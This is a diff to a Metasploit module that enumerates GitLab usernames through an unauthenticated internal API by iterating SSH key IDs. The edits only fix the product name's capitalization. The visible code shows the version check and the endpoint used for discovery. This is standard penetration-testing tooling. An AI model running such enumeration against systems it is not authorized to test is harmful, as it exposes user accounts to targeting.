@@ -15,13 +15,13 @@ class Metasploit3 < Msf::Auxiliary
   def initialize(info = {})
     super(update_info(
       info,
-      'Name'        => 'Gitlab User Enumeration',
+      'Name'        => 'GitLab User Enumeration',
       'Description' => "
-        The Gitlab 'internal' API is exposed unauthenticated on Gitlab. This
+        The GitLab 'internal' API is exposed unauthenticated on GitLab. This
         allows the username for each SSH Key ID number to be retrieved. Users
         who do not have an SSH Key cannot be enumerated in this fashion. LDAP
         users, e.g. Active Directory users will also be returned. This issue
-        was fixed in Gitlab v7.5.0 and is present from Gitlab v5.0.0.
+        was fixed in GitLab v7.5.0 and is present from GitLab v5.0.0.
       ",
       'Author'      => 'Ben Campbell',
       'License'     => MSF_LICENSE,
@@ -34,7 +34,7 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('TARGETURI', [ true, 'Path to Gitlab instance', '/']),
+        OptString.new('TARGETURI', [ true, 'Path to GitLab instance', '/']),
         OptInt.new('START_ID', [true, 'ID number to start from', 0]),
         OptInt.new('END_ID', [true, 'ID number to enumerate up to', 50])
       ], self.class)
@@ -44,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
     internal_api = '/api/v3/internal'
     check = normalize_uri(target_uri.path, internal_api, 'check')
 
-    print_status('Sending gitlab version request...')
+    print_status('Sending GitLab version request...')
     res = send_request_cgi(
         'uri' => check
     )
@@ -66,12 +66,12 @@ class Metasploit3 < Msf::Auxiliary
         host: rhost,
         port: rport,
         ssl: ssl,
-        info: "Gitlab Version - #{git_version}"
+        info: "GitLab Version - #{git_version}"
       )
     elsif res && res.code == 401
-      fail_with(Failure::NotVulnerable, 'Unable to retrieve Gitlab version...')
+      fail_with(Failure::NotVulnerable, 'Unable to retrieve GitLab version...')
     else
-      fail_with(Failure::Unknown, 'Unable to retrieve Gitlab version...')
+      fail_with(Failure::Unknown, 'Unable to retrieve GitLab version...')
     end
 
     discover = normalize_uri(target_uri.path, internal_api, 'discover')
@@ -110,12 +110,11 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def store_userlist(users, service)
-    loot = store_loot('gitlab.users', 'text/plain', rhost, users, nil, 'Gitlab Users', service)
+    loot = store_loot('gitlab.users', 'text/plain', rhost, users, nil, 'GitLab Users', service)
     print_good("Userlist stored at #{loot}")
   end
 
   def store_username(username, res)
-    # Should the service be 'Gitlab'?
     service = ssl ? 'https' : 'http'
     service_data = {
       address: rhost,
